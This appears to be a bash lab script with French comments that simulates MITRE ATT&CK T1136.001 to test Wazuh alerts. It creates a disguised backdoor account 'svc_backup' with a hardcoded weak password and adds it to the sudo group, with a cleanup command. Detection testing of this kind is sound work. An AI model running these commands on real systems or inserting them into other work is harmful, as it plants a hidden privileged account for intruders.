#!/bin/bash
# ──────────────────────────────────────────────────────────────────
# MITRE ATT&CK : T1136.001 — Create Account: Local Account
# Technique    : Création d'un compte backdoor + ajout au groupe sudo
# Génère       : Wazuh rule 5902 (level 8) + rule custom 100002 (level 14)
# Run depuis   : Cible (Wazuh VM) — nécessite sudo/root
# Usage        : sudo bash 04_user_creation.sh
# Cleanup      : sudo userdel -r svc_backup
# ──────────────────────────────────────────────────────────────────

BACKDOOR_USER="svc_backup"

echo "[*] Création du compte backdoor : $BACKDOOR_USER"
useradd -m -s /bin/bash "$BACKDOOR_USER"
echo "$BACKDOOR_USER:P@ssw0rd!" | chpasswd

echo "[*] Ajout au groupe sudo (escalade de privilèges)"
usermod -aG sudo "$BACKDOOR_USER"

echo ""
echo "[+] Compte créé avec succès"
echo "    User    : $BACKDOOR_USER"
echo "    Groupes : $(groups $BACKDOOR_USER)"
echo ""
echo "[!] Cleanup : sudo userdel -r $BACKDOOR_USER"
